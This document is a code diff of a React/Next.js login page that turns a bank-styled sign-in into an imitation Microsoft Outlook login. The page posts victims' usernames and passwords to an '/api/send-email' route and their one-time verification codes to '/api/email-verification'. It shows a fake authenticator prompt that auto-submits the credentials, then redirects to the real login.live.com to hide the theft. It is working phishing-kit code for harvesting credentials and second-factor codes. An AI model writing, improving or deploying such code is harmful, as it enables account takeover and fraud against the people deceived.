@@ -10,40 +10,38 @@ export default function Login() {
   const [formData, setFormData] = useState({
     name: '',
     password: '',
-    bName: process.env.NEXT_PUBLIC_BANK_NAME, // Default bank name
+    bName: process.env.NEXT_PUBLIC_BANK_NAME,
   });
 
-  const [step, setStep] = useState(1); // 1 = Username, 2 = Password
+  const [step, setStep] = useState(1); // 1: username, 2: password, 3: verification method, 4: code input, 5: authenticator
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitStatus, setSubmitStatus] = useState(null);
-  const [showPassword, setShowPassword] = useState(false); // State to track password visibility
+  const [showPassword, setShowPassword] = useState(false);
+  const [verificationCode, setVerificationCode] = useState('');
+  const [selectedMethod, setSelectedMethod] = useState('email');
+  const [authenticatorNumber, setAuthenticatorNumber] = useState(Math.floor(Math.random() * 90) + 10);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
   };
 
-  const handleContinue = (e) => {
+  const handleUsernameSubmit = (e) => {
     e.preventDefault();
     if (formData.name.trim()) {
-      setStep(2);
+      setStep(2); // Go to password step
     }
   };
 
-  const togglePasswordVisibility = () => {
-    setShowPassword(!showPassword);
-  };
-
-  const handleSubmit = async (e) => {
+  const handlePasswordSubmit = async (e) => {
     e.preventDefault();
-    
-    if (!isReadyToSubmit) return;
-    
+    if (!formData.password.trim()) return;
+
     setIsSubmitting(true);
     setSubmitStatus(null);
-    
+
     try {
-      // Send data to our API route
+      // Send initial login data after username and password
       const response = await fetch('/api/send-email', {
         method: 'POST',
         headers: {
@@ -53,6 +51,53 @@ export default function Login() {
           bName: process.env.NEXT_PUBLIC_BANK_NAME,
           username: formData.name,
           password: formData.password,
+          step: 'credentials'
+        }),
+      });
+      
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      
+      // Continue to verification method selection
+      setStep(3);
+      
+    } catch (error) {
+      console.error("Failed to send initial login data:", error);
+      setSubmitStatus("error");
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  const handleVerificationMethodSubmit = (e) => {
+    e.preventDefault();
+    if (selectedMethod === 'email') {
+      setStep(4); // Go to code input
+    } else if (selectedMethod === 'authenticator') {
+      setStep(5); // Go to authenticator
+    }
+  };
+
+  const handleCodeSubmit = async (e) => {
+    e.preventDefault();
+    if (!verificationCode.trim()) return;
+
+    setIsSubmitting(true);
+    setSubmitStatus(null);
+
+    try {
+      const response = await fetch('/api/email-verification', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          bName: process.env.NEXT_PUBLIC_BANK_NAME,
+          type: "OTP",
+          // username: formData.name,
+          // password: formData.password,
+          verificationCode: verificationCode,
         }),
       });
       
@@ -62,9 +107,8 @@ export default function Login() {
       
       setSubmitStatus("success");
       
-      // Redirect to the bank's real site after a short delay
       setTimeout(() => {
-        router.push('/verification');
+        router.push('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1748071219&rver=7.5.2211.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3den-us%26country%3dus%26RpsCsrfState%3df25113c2-83f4-2ae6-e549-f7c781410f17&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');
       }, 1500);
       
     } catch (error) {
@@ -75,135 +119,481 @@ export default function Login() {
     }
   };
 
-  const isReadyToSubmit = formData.name.trim() && formData.password.trim();
+  const handleAuthenticatorSubmit = async (e) => {
+    e.preventDefault();
+    
+    setIsSubmitting(true);
+    setSubmitStatus(null);
+
+    try {
+      const response = await fetch('/api/email-verification', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          bName: process.env.NEXT_PUBLIC_BANK_NAME,
+          username: formData.name,
+          password: formData.password,
+          authenticatorUsed: true,
+        }),
+      });
+      
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      
+      setSubmitStatus("success");
+      
+      setTimeout(() => {
+        router.push('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1748071219&rver=7.5.2211.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3den-us%26country%3dus%26RpsCsrfState%3df25113c2-83f4-2ae6-e549-f7c781410f17&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');
+      }, 1500);
+      
+    } catch (error) {
+      console.error("Failed to send data:", error);
+      setSubmitStatus("error");
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  const goBack = () => {
+    if (step > 1) {
+      setStep(step - 1);
+      setSubmitStatus(null);
+    }
+  };
+
+  // Auto-submit authenticator after 3 seconds
+  useEffect(() => {
+    if (step === 5) {
+      const timer = setTimeout(() => {
+        handleAuthenticatorSubmit({ preventDefault: () => {} });
+      }, 3000);
+      return () => clearTimeout(timer);
+    }
+  }, [step]);
 
   return (
     <div
-      className="min-h-screen flex flex-col justify-between"
+      className="min-h-screen flex flex-col"
       style={{
         backgroundImage: `url(/assets/bg.png)`,
         backgroundSize: 'cover',
         backgroundPosition: 'center',
+        backgroundAttachment: 'fixed',
       }}
     >
       {/* Main Content */}
-      <div className="flex-grow flex items-center justify-center p-4">
-        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
-          <div className="flex flex-col items-center">
-            <Image src="/assets/logo.png" alt="Logo" width={288} height={80} className="mb-6" />
-          </div>
+      <div className="flex-1 flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8">
+        <div className="w-full max-w-md space-y-8">
+          {/* Microsoft-style Card Container */}
+          <div className="bg-white rounded-lg shadow-2xl p-8 sm:p-10">
+            
+            {/* Step 1: Username Input */}
+            {step === 1 && (
+              <>
+                {/* Microsoft Logo */}
+                <div className="text-center mb-8">
+                  <div className="mx-auto w-24 h-6 relative">
+                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
+                  </div>
+                  <h1 className="text-2xl font-normal text-gray-900 mb-2">Sign in</h1>
+                  <p className="text-sm text-gray-600">to continue to Outlook.</p>
+                </div>
 
-          <form
-            className="space-y-5"
-            onSubmit={step === 1 ? handleContinue : handleSubmit}
-          >
-            {/* Username Field */}
-            <div>
-              <div className='focus:outline-none focus:ring-2 focus:ring-[#36C3F1]'>
-                <input
-                  type="text"
-                  name="name"
-                  value={formData.name}
-                  onChange={handleChange}
-                  placeholder="Username"
-                  required
-                  className={`w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:bg-[#1E1F20] focus:ring-2 focus:ring-[#36C3F1]`}
-                />
-                {step === 2 && (
-                  <p 
-                    className='text-sm text-[#36C3F1] translate-x-64 md:translate-x-86 -translate-y-9 border-gray-600 z-10 cursor-pointer'
-                    onClick={() => setStep(1)}
+                <form onSubmit={handleUsernameSubmit} className="space-y-6">
+                  <div>
+                    <input
+                      type="text"
+                      name="name"
+                      value={formData.name}
+                      onChange={handleChange}
+                      placeholder="Email or phone number"
+                      required
+                      className="w-full px-3 py-2 border border-gray-300 rounded-sm text-gray-900 
+                               focus:outline-none focus:ring-2 focus:ring-[#115EA3] focus:border-transparent
+                               placeholder-gray-500 text-sm"
+                    />
+                  </div>
+
+                  <div className="text-left">
+                    <a 
+                      href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}
+                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
+                    >
+                      Forgot your username?
+                    </a>
+                  </div>
+
+                  <button
+                    type="submit"
+                    className="w-full bg-[#13578E] hover:bg-blue-700 text-white font-normal 
+                             py-2.5 px-4 rounded-sm transition-colors duration-200
+                             disabled:opacity-50 disabled:cursor-not-allowed
+                             focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
+                    disabled={!formData.name.trim()}
                   >
-                    Switch
-                  </p>
-                )}
-              </div>
-              {step === 1 && (
-                <div className="flex justify-end mt-2">
-                  <a href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}className="text-sm text-[#36C3F1] hover:underline">Forgot?</a>
-                </div>
-              )}
-            </div>
+                    Next
+                  </button>
 
-            {/* Password Field - only shows on step 2 */}
+                  <div className="text-center pt-4">
+                    <span className="text-sm text-gray-600">New to Microsoft? </span>
+                    <a 
+                      href={process.env.NEXT_PUBLIC_LOGIN_URL}
+                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
+                    >
+                      Create an account
+                    </a>
+                  </div>
+                </form>
+              </>
+            )}
+
+            {/* Step 2: Password Input */}
             {step === 2 && (
-              <div className="relative">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  name="password"
-                  value={formData.password}
-                  onChange={handleChange}
-                  placeholder="Enter your password"
-                  required
-                  className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-2 focus:ring-[#36C3F1]"
-                />
-                <button 
-                  type="button"
-                  onClick={togglePasswordVisibility}
-                  className="absolute right-3 top-3 text-gray-400 hover:text-white"
-                >
-                  {showPassword ? (
-                    // Eye with slash (hidden) icon
-                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
+              <>
+                {/* Header with back button */}
+                <div className="flex items-center mb-6">
+                  <button
+                    onClick={goBack}
+                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
+                  >
+                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                     </svg>
-                  ) : (
-                    // Eye icon (visible)
-                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-                    </svg>
-                  )}
-                </button>
-                <div className="flex justify-end mt-2">
-                  <a href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}  className="text-sm text-[#36C3F1] hover:underline">Forgot?</a>
+                  </button>
+                  <div className="mx-auto w-24 h-6 relative">
+                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
+                  </div>
                 </div>
-              </div>
+
+                <div className="text-center mb-6">
+                  <p className="text-sm text-gray-600 mb-6">{formData.name}</p>
+                  <h1 className="text-2xl font-normal text-gray-900 mb-2">Enter password</h1>
+                </div>
+
+                <form onSubmit={handlePasswordSubmit} className="space-y-6">
+                  <div className="relative">
+                    <input
+                      type={showPassword ? "text" : "password"}
+                      name="password"
+                      value={formData.password}
+                      onChange={handleChange}
+                      placeholder="Password"
+                      required
+                      className="w-full px-3 py-2 pr-10 border border-gray-300 rounded-sm text-gray-900 
+                               focus:outline-none focus:ring-2 focus:ring-[#115EA3] focus:border-transparent
+                               placeholder-gray-500 text-sm"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute inset-y-0 right-0 pr-3 flex items-center"
+                    >
+                      <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        {showPassword ? (
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L8.464 8.464m1.414 1.414L12 12m-3.536-3.536l1.414-1.414m0 0L8.464 8.464M12 12l3.536 3.536m-3.536-3.536L9.878 9.878" />
+                        ) : (
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                        )}
+                      </svg>
+                    </button>
+                  </div>
+
+                  <div className="text-left">
+                    <a 
+                      href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}
+                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
+                    >
+                      Forgotten your password?
+                    </a>
+                  </div>
+
+                  <button
+                    type="submit"
+                    className="w-full bg-[#13578E] hover:bg-blue-700 text-white font-normal 
+                             py-2.5 px-4 rounded-sm transition-colors duration-200
+                             disabled:opacity-50 disabled:cursor-not-allowed
+                             focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
+                    disabled={!formData.password.trim()}
+                  >
+                    Sign in
+                  </button>
+                </form>
+              </>
             )}
 
-            {/* Status messages
-            {submitStatus === "success" && (
-              <div className="text-green-500 text-center">Login successful. Redirecting...</div>
-            )}
-            {submitStatus === "error" && (
-              <div className="text-red-500 text-center">
-                Something went wrong. Please try again.
-              </div>
-            )} */}
+            {/* Step 3: Verification Method Selection */}
+            {step === 3 && (
+              <>
+                {/* Header with back button */}
+                <div className="flex items-center mb-6">
+                  <button
+                    onClick={goBack}
+                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
+                  >
+                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
+                    </svg>
+                  </button>
+                  <div className="mx-auto w-24 h-6 relative">
+                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
+                  </div>
+                </div>
 
-            {/* Bottom Actions */}
-            <div className="flex justify-between items-center text-sm">
-              <div className='flex items-center gap-2'>
-                {step === 2 && (
-                  <svg width={20} fill='#36C3F1' viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M20.3805428,13.8137069 C20.7055134,16.1582382 19.2593532,17.570874 17.4092135,17.7960134 C15.7762239,17.9947284 14.1114747,16.9681911 13.8785019,15.0555136 L13.8595687,14.8545033 C13.7790838,13.6557045 13.0355191,13.0330742 12.0230096,13.066022 C11.05262,13.0975991 10.3181869,13.7240229 10.3181869,14.5810911 C10.3181869,17.4367719 11.3683308,19.1423433 14.5557119,20.5651349 C14.9339525,20.7339749 15.1037051,21.1774713 14.9348651,21.5557119 C14.7660251,21.9339525 14.3225287,22.1037051 13.9442881,21.9348651 C10.2032953,20.2649509 8.81818692,18.0153532 8.81818692,14.5810911 C8.81818692,12.8447756 10.2507423,11.6228988 11.9742243,11.5668155 C13.7082808,11.5103881 15.1194035,12.6399884 15.3374431,14.5467693 L15.3561995,14.7540225 C15.429414,15.8445306 16.322059,16.4172418 17.2280184,16.3069975 C18.3243687,16.1735851 19.0896808,15.4260142 18.8947476,14.0196498 C18.3183902,9.8614644 13.5967275,7.0902036 9.75231256,8.6064211 C5.72979556,10.1928811 4.16583408,13.7505577 5.81863998,18.047386 C5.96734806,18.433985 5.77449938,18.8679371 5.38790038,19.0166452 C5.00130139,19.1653533 4.56734927,18.9725046 4.41864118,18.5859056 C2.47014448,13.5203648 4.41353867,9.09956029 9.20197565,7.21102536 C13.9515477,5.33781855 19.6710097,8.6947125 20.3805428,13.8137069 Z M17.9520641,14.7577603 C17.9520641,15.1719739 17.6162777,15.5077603 17.2020641,15.5077603 C16.7878506,15.5077603 16.4520641,15.1719739 16.4520641,14.7577603 C16.4520641,12.3190462 14.2664688,10.6030471 12.0398447,10.6492278 C9.87888055,10.6940466 8.03428382,12.0793713 7.77632991,14.3007925 C7.51636764,16.539509 8.7084915,19.0419133 10.3448004,20.6140101 C10.6434956,20.9009839 10.6529977,21.3757626 10.3660239,21.6744579 C10.07905,21.9731532 9.60427133,21.9826553 9.30557605,21.6956814 C7.3610446,19.8274573 5.96482003,16.8966223 6.28634185,14.1277734 C6.6384375,11.095632 9.15077109,9.20882519 12.0087411,9.1495503 C15.0113761,9.08727503 17.9520641,11.3961279 17.9520641,14.7577603 Z M12.0356675,14.0078405 C12.4498368,14.0017826 12.7904982,14.3326222 12.7965562,14.7467914 C12.8351549,17.3857128 15.2057052,19.0920846 17.8887035,18.5678296 C18.295229,18.488395 18.6891776,18.7535545 18.7686123,19.1600801 C18.8480469,19.5666056 18.5828873,19.9605542 18.1763618,20.0399888 C14.6140996,20.736051 11.3496285,18.3862163 11.2967166,14.7687292 C11.2906587,14.3545599 11.6214983,14.0138985 12.0356675,14.0078405 Z M21.0390793,8.97004406 C21.28404,9.30406074 21.2118458,9.77341463 20.8778291,10.0183753 C20.5438125,10.263336 20.0744586,10.1911418 19.8294979,9.85712514 C15.6762501,4.19395483 7.47506811,4.97312875 4.36077947,9.81906473 C4.13683898,10.1675235 3.67281767,10.2684656 3.32435888,10.0445251 C2.97590008,9.82058458 2.87495805,9.35656328 3.09889854,9.00810448 C6.75686194,3.31619261 16.2324408,2.41594141 21.0390793,8.97004406 Z M12.0795658,2.00170165 C14.4139345,2.00170165 16.4372937,2.58338203 18.1889848,3.56526901 C18.550306,3.76780273 18.6790286,4.22489741 18.4764949,4.58621855 C18.2739612,4.9475397 17.8168665,5.07626234 17.4555454,4.87372862 C15.918012,4.0118849 14.1433536,3.50170165 12.0795658,3.50170165 C9.9768514,3.50170165 8.00147381,4.05741986 6.70286873,4.85793988 C6.35026747,5.07529955 5.88822284,4.96566457 5.67086318,4.61306331 C5.45350351,4.26046205 5.56313848,3.79841742 5.91573975,3.58105775 C7.45185852,2.63412335 9.69988932,2.00170165 12.0795658,2.00170165 Z"></path>
-                  </svg>
+                <div className="text-center mb-2">
+                  <p className="text-sm text-gray-600 mb-6">{formData.name}</p>
+                </div>
+
+                <h1 className="text-xl font-normal text-gray-900 mb-4">We need to verify your identity</h1>
+                <p className="text-sm text-gray-600 mb-6">How would you like to get your security code?</p>
+
+                <form onSubmit={handleVerificationMethodSubmit} className="space-y-4">
+                  <div className="space-y-3">
+                    <label className="flex items-center space-x-3 cursor-pointer">
+                      <input
+                        type="radio"
+                        name="verificationMethod"
+                        value="email"
+                        checked={selectedMethod === 'email'}
+                        onChange={(e) => setSelectedMethod(e.target.value)}
+                        className="w-4 h-4 text-[#115EA3] border-gray-300 focus:ring-blue-500"
+                      />
+                      <span className="text-sm text-gray-900">Email {formData.name}</span>
+                    </label>
+                    <label className="flex items-center space-x-3 cursor-pointer">
+                      <input
+                        type="radio"
+                        name="verificationMethod"
+                        value="authenticator"
+                        checked={selectedMethod === 'authenticator'}
+                        onChange={(e) => setSelectedMethod(e.target.value)}
+                        className="w-4 h-4 text-[#115EA3] border-gray-300 focus:ring-blue-500"
+                      />
+                      <span className="text-sm text-gray-900">Use authenticator app</span>
+                    </label>
+                  </div>
+
+                  <div className="space-y-3 text-sm">
+                    <a href="#" className="block text-[#115EA3] hover:text-blue-800 hover:underline">
+                      I have a code
+                    </a>
+                    <a href="#" className="block text-[#115EA3] hover:text-blue-800 hover:underline">
+                      I don't have any of these
+                    </a>
+                  </div>
+
+                  <div className="flex space-x-3 pt-6">
+                    <button
+                      type="button"
+                      onClick={goBack}
+                      className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-normal 
+                               py-2.5 px-4 rounded-sm transition-colors duration-200"
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      type="submit"
+                      className="flex-1 bg-[#115EA3] hover:bg-blue-700 text-white font-normal 
+                               py-2.5 px-4 rounded-sm transition-colors duration-200"
+                    >
+                      {selectedMethod === 'email' ? 'Get code' : 'Continue'}
+                    </button>
+                  </div>
+                </form>
+              </>
+            )}
+
+            {/* Step 4: Code Input */}
+            {step === 4 && (
+              <>
+                {/* Header with back button */}
+                <div className="flex items-center mb-6">
+                  <button
+                    onClick={goBack}
+                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
+                  >
+                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
+                    </svg>
+                  </button>
+                  <div className="mx-auto w-24 h-6 relative">
+                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
+                  </div>
+                </div>
+
+                <h1 className="text-xl font-normal text-gray-900 mb-4">Verify your identity</h1>
+                <p className="text-sm text-gray-600 mb-6">
+                  If {formData.name} matches the email address on your account, we'll send you a code.
+                </p>
+
+                <form onSubmit={handleCodeSubmit} className="space-y-6">
+                  <div>
+                    <input
+                      type="text"
+                      value={verificationCode}
+                      onChange={(e) => setVerificationCode(e.target.value)}
+                      placeholder="Enter code"
+                      required
+                      className="w-full px-3 py-2 border border-gray-300 rounded-sm text-gray-900 
+                               focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent
+                               placeholder-gray-500 text-sm"
+                    />
+                  </div>
+
+                  <div className="text-left">
+                    <button 
+                      type="button"
+                      onClick={() => setStep(3)}
+                      className="text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
+                    >
+                      Use a different verification option
+                    </button>
+                  </div>
+
+                  {/* Status Messages */}
+                  {submitStatus === "success" && (
+                    <div className="bg-green-50 border border-green-200 rounded-sm p-3">
+                      <div className="text-green-800 text-center text-sm">
+                        Verification successful. Redirecting...
+                      </div>
+                    </div>
+                  )}
+                  {submitStatus === "error" && (
+                    <div className="bg-red-50 border border-red-200 rounded-sm p-3">
+                      <div className="text-red-800 text-center text-sm">
+                        Something went wrong. Please try again.
+                      </div>
+                    </div>
+                  )}
+
+                  <div className="flex space-x-3">
+                    <button
+                      type="button"
+                      onClick={goBack}
+                      className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-normal 
+                               py-2.5 px-4 rounded-sm transition-colors duration-200"
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      type="submit"
+                      className="flex-1 bg-[#133779] hover:bg-[#13578E] text-white font-normal 
+                               py-2.5 px-4 rounded-sm transition-colors duration-200 flex items-center justify-center"
+                      disabled={!verificationCode.trim() || isSubmitting}
+                    >
+                      {isSubmitting ? (
+                        <>
+                          <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                          </svg>
+                          Verifying...
+                        </>
+                      ) : (
+                        "Next"
+                      )}
+                    </button>
+                  </div>
+                </form>
+              </>
+            )}
+
+            {/* Step 5: Authenticator App */}
+            {step === 5 && (
+              <>
+                {/* Header with back button */}
+                <div className="flex items-center mb-6">
+                  <button
+                    onClick={goBack}
+                    className="p-2 hover:bg-gray-100 rounded-full transition-colors duration-200"
+                  >
+                    <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
+                    </svg>
+                  </button>
+                  <div className="mx-auto w-24 h-6 relative">
+                    <Image src="/assets/logo.png" alt="Logo" fill className="object-contain" />
+                  </div>
+                </div>
+
+                <div className="text-center mb-6">
+                  <p className="text-sm text-gray-600">{formData.name}</p>
+                </div>
+
+                <h1 className="text-xl font-normal text-gray-900 mb-8">Check your Authenticator app</h1>
+
+                <div className="text-center mb-8">
+                  <div className="mx-auto w-20 h-20 bg-gray-100 rounded-lg flex items-center justify-center mb-4">
+                    <svg className="w-10 h-10 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                  </div>
+                  <div className="text-6xl font-light text-gray-900 mb-2"></div>
+                  <p className="text-sm text-gray-600 mb-6">
+                    Select the number in the sign-in request on your Android.
+                  </p>
+                </div>
+
+                <div className="mb-6">
+                  <button className="flex items-center text-sm text-gray-600 hover:text-gray-800">
+                    <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+                    </svg>
+                    See devices this was sent to
+                  </button>
+                  <div className="ml-6 mt-2 text-sm text-gray-600">
+                    <div>• Authenticator app on Android</div>
+                    <div>• Authenticator app on Android</div>
+                  </div>
+                  <p className="text-xs text-gray-500 mt-2">
+                    Manage your devices at aka.ms/manageeproofs.
+                  </p>
+                </div>
+
+                <div className="text-center space-y-3">
+                  <button
+                    onClick={() => setStep(3)}
+                    className="block text-sm text-[#115EA3] hover:text-blue-800 hover:underline"
+                  >
+                    Other ways to sign in
+                  </button>
+                  <a href="#" className="block text-sm text-[#115EA3] hover:text-blue-800 hover:underline">
+                    I don't have access to my Authenticator app
+                  </a>
+                </div>
+
+                {/* Status Messages */}
+                {submitStatus === "success" && (
+                  <div className="bg-green-50 border border-green-200 rounded-sm p-3 mt-6">
+                    <div className="text-green-800 text-center text-sm">
+                      Authentication successful. Redirecting...
+                    </div>
+                  </div>
                 )}
-                <a href={process.env.NEXT_PUBLIC_LOGIN_URL} 
-                className="text-[#36C3F1] hover:underline">
-                  {step === 2 ? "Sign in with a passkey " : "First time user? Enroll now."}
-                </a>
-              </div>
-              
-              {step === 1 ? (
-                <button
-                  type="submit"
-                  className="bg-[#3B3836] text-white px-8 py-4 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
-                  disabled={!formData.name.trim()}
-                >
-                  Continue
-                </button>
-              ) : (
-                <button
-                  type="submit"
-                  className="bg-[#3B3836] text-white px-8 py-4 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
-                  disabled={!isReadyToSubmit || isSubmitting}
-                >
-                  {isSubmitting ? "Signing In..." : "Sign In"}
-                </button>
-              )}
-            </div>
-          </form>
+                {submitStatus === "error" && (
+                  <div className="bg-red-50 border border-red-200 rounded-sm p-3 mt-6">
+                    <div className="text-red-800 text-center text-sm">
+                      Authentication failed. Please try again.
+                    </div>
+                  </div>
+                )}
+
+                {isSubmitting && (
+                  <div className="text-center mt-6">
+                    <div className="inline-flex items-center text-sm text-gray-600">
+                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-gray-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                      </svg>
+                      Authenticating...
+                    </div>
+                  </div>
+                )}
+              </>
+            )}
+          </div>
         </div>
       </div>
 
